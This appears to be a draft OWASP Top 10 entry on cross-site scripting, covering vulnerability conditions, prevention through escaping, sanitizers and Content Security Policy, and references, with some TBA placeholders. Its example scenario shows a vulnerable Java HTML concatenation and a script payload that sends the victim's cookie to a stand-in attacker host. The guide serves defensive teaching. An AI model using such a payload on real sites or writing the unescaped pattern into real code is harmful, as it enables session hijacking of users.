# A3 Cross Site Scripting

| Threat agents | Exploitability | Prevalance | Detectability | Technical Impact | Business Impacts |
| --- | --- | --- | --- | --- | --- |
| App Specific |  EASY | COMMON | AVERAGE | SEVERE | App Specific | 
| TBA | TBA | TBA | TBA. | TBA |

## Am I vulnerable to attack?

You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don’t use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.
Automated tools can find some XSS problems automatically. 

However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies. This diveristy makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries. Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.

## How do I prevent

Preventing XSS requires separation of untrusted data from active browser content.

To avoid Server XSS, the preferred option is to properly escape untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into. See the OWASP XSS Prevention Cheat Sheet for details on the required data escaping techniques.

To avoid Client XSS, the preferred option is to avoid passing untrusted data to JavaScript and other browser APIs that can generate active content. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP DOM based XSS Prevention Cheat Sheet.

For rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.
Use [Content Security Policy](https://www.owasp.org/index.php/Content_Security_Policy) (CSP) to mitigate the impact of potential XSS across your entire site.

## Example Scenarios

The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`

The attacker modifies the ‘CC’ parameter in his browser to:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. 
Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See 2017-A8 for info on CSRF.

## References

### OWASP
* [OWASP Proactive Controls - TBA]()
* [OWASP Application Security Verification Standard - TBA]()
* [OWASP Testing Guide: 1st 3 Chapters on Data Validation Testing]()
* OWASP Types of Cross-Site Scripting
* OWASP XSS Prevention Cheat Sheet
* OWASP DOM based XSS Prevention Cheat Sheet
* OWASP XSS Filter Evasion Cheat Sheet
### External
* CWE Entry 79 on Cross-Site Scripting
* Do we have a non-vendor reference for this? [PortSwigger: Client-side template injection](https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection)
